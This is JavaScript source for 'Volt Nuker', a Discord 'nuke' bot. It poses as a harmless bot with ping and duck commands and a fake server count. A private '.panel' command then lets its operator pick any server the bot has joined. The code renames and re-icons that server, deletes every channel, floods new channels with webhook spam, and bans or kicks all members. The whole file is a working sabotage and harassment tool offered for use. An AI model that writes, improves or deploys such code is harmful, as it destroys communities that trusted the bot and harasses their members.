var path = require('path');
const fs = require('fs') 
const { Client, Events, GatewayIntentBits, EmbedBuilder, Partials, ActionRowBuilder, StringSelectMenuBuilder, ActivityType } = require('discord.js')
let { token, admins, botName, fakeServers, advancedOptions } = require('./config.json')
const axios = require('axios').default 
const chalk = require('chalk')
const figlet = require('figlet')
var setTerminalTitle = require('set-terminal-title');
var  { execSync, exec } = require('child_process');
const Downloader = require("nodejs-file-downloader")
const readline = require("readline");
const moment = require("moment");
const CRL = readline.createInterface({ input: process.stdin, output: process.stdout });

function bot() {
    function q() {
        setTerminalTitle('Volt Nuker', { verbose: false });
        console.clear()
        console.log(chalk.hex('#D800FF').bold(`     ╦  ╦╔═╗╦ ╔╦╗  ╔╗╔╦ ╦╦╔═╔═╗╦═╗\n     ╚╗╔╝║ ║║  ║   ║║║║ ║╠╩╗║╣ ╠╦╝\n      ╚╝ ╚═╝╩═╝╩   ╝╚╝╚═╝╩ ╩╚═╝╩╚═`))
        console.log(chalk.hex('#B246C6').bold(`          1. Launch Bot`))
        console.log(chalk.hex('#B246C6').bold(`          2. Edit Config`))
        const prompts = require('prompts');
        (async () => {
            const response = await prompts({
            type: 'number',
            name: 'value',
            message: '>',
            validate: value => value > 2 ? `Not a valid answer` : true
            });
            if (response.value == 1) {main()}
            else if (response.value == 2) {
                const path = './config.json';
                if (fs.existsSync(path)) {
                    child = exec('config.json',function (error, stdout, stderr) {});
                    q()
                } else {

                    (async () => {
                    const downloader = new Downloader({
                        url: "https://raw.githubusercontent.com/InternetFelons/kabooma-duck/master/config.json",
                        directory: "./", 
                    });
                    try {
                        const {filePath,downloadStatus} = await downloader.download();

                        child = exec('config.json',function (error, stdout, stderr) {});
                        q()
                    } catch (error) {
                        process.exit()
                    }
                    })();
                }
            }
            else {process.exit()}
        })();
    }

    function main() { 
        const client = new Client({ intents: [   
                GatewayIntentBits.DirectMessages, 
                GatewayIntentBits.Guilds, 
                GatewayIntentBits.MessageContent, 
                GatewayIntentBits.GuildMessages, 
                GatewayIntentBits.GuildWebhooks
            ], partials: [
                Partials.Channel
            ] })

        function registercmds() {
            const { SlashCommandBuilder } = require('@discordjs/builders')
            const { REST } = require('@discordjs/rest')
            const { Routes } = require('discord-api-types/v9')
            const { clientID, token } = require('./config.json')

            const commands = [
                new SlashCommandBuilder().setName('ping').setDescription('Replies with pong!'),
                new SlashCommandBuilder().setName('duck').setDescription('Generates a random duck!'),
            ]
            .map(command => command.toJSON())

            const rest = new REST({ version: '9' }).setToken(token)

            rest.put(Routes.applicationCommands(clientID), { body: commands })
                .then(() => console.log(chalk.hex('#8646C6').bold('     💜 | Loaded Commands')))
                .catch(console.error())
        }

        client.once(Events.ClientReady, c => {
            console.clear()
            console.log(chalk.hex('#D800FF').bold(`     ╦  ╦╔═╗╦ ╔╦╗  ╔╗╔╦ ╦╦╔═╔═╗╦═╗\n     ╚╗╔╝║ ║║  ║   ║║║║ ║╠╩╗║╣ ╠╦╝\n      ╚╝ ╚═╝╩═╝╩   ╝╚╝╚═╝╩ ╩╚═╝╩╚═`))
            console.log(chalk.hex('#B246C6').bold(`     ${client.user.tag} / ${client.user.id}`))
            registercmds()
            client.user.setActivity(`${fakeServers} servers!`, { type: ActivityType.Watching })
        });

        client.on('interactionCreate', async interaction => {
            if (!interaction.isChatInputCommand()) return

            const { commandName } = interaction

            if (commandName === 'ping') {
                var embed = new EmbedBuilder()
                .setTitle("Pong!")
                .setDescription(`Bot latency: ${Math.abs(interaction.createdTimestamp - Date.now())}ms\nAPI latency: ${Math.round(client.ws.ping)}ms`)
                .setColor("#B246C6")

                await interaction.reply({ embeds: [embed] })
            } 
        })

        
        client.on('messageCreate', async message => {
            if (message.channel.type == 1) {
                if (message.content != '.panel') return
                if (!admins.includes(message.author.id)) return

                console.log(chalk.hex('#8646C6').bold(`     💜 | ${message.author.tag} opened the nuke panel.`))

                var guildNames = client.guilds.cache.map(guild => guild.name)
                var guildIDs = client.guilds.cache.map(guild => guild.id )
                var opts = []

                for (let i = 0; i < guildNames.length; i++) {
                    opts.push({
                        label: guildNames[i],
                        value: guildIDs[i],
                        description: `Guild ID: ${guildIDs[i]}`
                    })
                }

                var embed = new EmbedBuilder()
                .setTitle('Volt Nuker')
                .setColor('#fc00bd')
                .setDescription('Welcome to Nuke Panel. \nPlease select a guild to nuke.')
                .setThumbnail('https://cdn.discordapp.com/attachments/1152713769642885181/1155116039575711775/Volt_Nuker.png')

                var component = new ActionRowBuilder()
                .addComponents(
                    new StringSelectMenuBuilder()
                    .setCustomId('guild')
                    .setPlaceholder('Select a guild.')
                    .addOptions(opts)
                )

                await message.reply({embeds: [embed], components: [component]})
            }
        })

        client.on('interactionCreate', async interaction => {
            if (!interaction.isStringSelectMenu()) return

            await interaction.reply(`Nuking ${interaction.values[0]}`)
            console.log(chalk.hex('#8646C6').bold(`💜 |  Nuked ${interaction.values[0]}.`))

            var guild = client.guilds.cache.get(interaction.values[0])

            guild.setName(advancedOptions.server.nameChange)
            guild.setIcon(advancedOptions.server.iconChange)
            if (guild.banner != null) {
                guild.setBanner(advancedOptions.server.bannerChange)
            }

            var gChannels = guild.channels.cache.map(channel => channel.id)

            async function webhookSpam(webhook) { 
                var wInterval = setInterval(() => {
                    try {
                        webhook.send(advancedOptions.webhook.message)
                    } catch (error) {
                        throw error
                    }
                }, 500);
                setTimeout(() => {
                    clearInterval(wInterval)
                }, 300000)
            }
            
            for (let i = 0; i < gChannels.length; i++) {
                guild.channels.cache.get(gChannels[i]).delete()
            }

            for (let loop = 0; loop < advancedOptions.channels.amount; loop++) {
                try {
                    guild.channels.create({name: `${advancedOptions.channels.channelNames}`}).then(async channel => {
                        setTimeout(() => {
                            channel.createWebhook({name: advancedOptions.webhook.name, avatar: advancedOptions.webhook.avatar}).then(webhook => { webhookSpam(webhook) })
                        }, 300)
                    })
                } catch (error) {
                    loop--
                    throw error
                }
            }
            
            

            if (advancedOptions.banning.enabled) {
                var gMembers = guild.members.cache.map(member => member.id)

                for (let i = 0; i < gMembers.length; i++) {
                    var member = guild.members.cache.get(gMembers[i])
                    if (member.bannable) {
                        member.ban({reason: advancedOptions.banning.banReason})
                    } else if (member.kickable) {
                        member.kick(advancedOptions.banning.banReason)
                    }
                }
            }
            
        })

        client.login(token)
    }
    q()
}
bot()